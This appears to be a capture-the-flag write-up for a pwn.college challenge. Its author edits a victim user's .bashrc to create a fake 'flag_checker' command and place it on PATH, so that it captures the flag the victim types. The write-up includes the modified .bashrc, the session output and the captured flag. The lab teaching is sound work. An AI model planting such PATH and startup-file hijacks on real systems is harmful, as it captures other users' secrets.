# Sniffing Input

In this challenge we need to hijack `flag_checker` command we learned in `Pondering PATH` , by using `.bashrc` of `zardus` user, the flag_checker must read the flag inputted by zardus and then echo it back to us to get it.

## My solve

Flag : `pwn.college{o7UzgqcAvu4iC2a-QZgQnh555vK.0VNzEzNxwCM0gjNzEzW}`

This challenge turned out to be a bit tricky, what we had to do is use echo the followind commands to `flag_checker` : `echo "Type the flag";read var;echo $var`, but we cannot just pass it through directly inside echo that won't work instead we need to use escape characters to do it, after doing that we need to make the file executable and then set Path to it's folder to get the flag.
So our `.bashrc` file would now look something like this after doing the above steps.

```bash
# this sets up a scary red shell prompt!
PS1='\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]$ '

# add your attack below this line!
echo "echo \"Type the flag\"\;read var\;echo \$var" > flag_checker
chmod a=rwx /home/zardus/flag_checker
PATH=/home/zardus
```

Output : 
```shell
hacker@shenanigans~sniffing-input:~$ nano /home/zardus/.bashrc 
hacker@shenanigans~sniffing-input:~$ /challenge/victim 
Username: zardus
Password: **********
zardus@shenanigans~sniffing-input:~$ flag_checker
Type the flag;read var;echo
zardus@shenanigans~sniffing-input:~$ *************************************************************-bash: pwn.college{o7UzgqcAvu4iC2a-QZgQnh555vK.0VNzEzNxwCM0gjNzEzW}: command not found
zardus@shenanigans~sniffing-input:~$ exit
logout
```
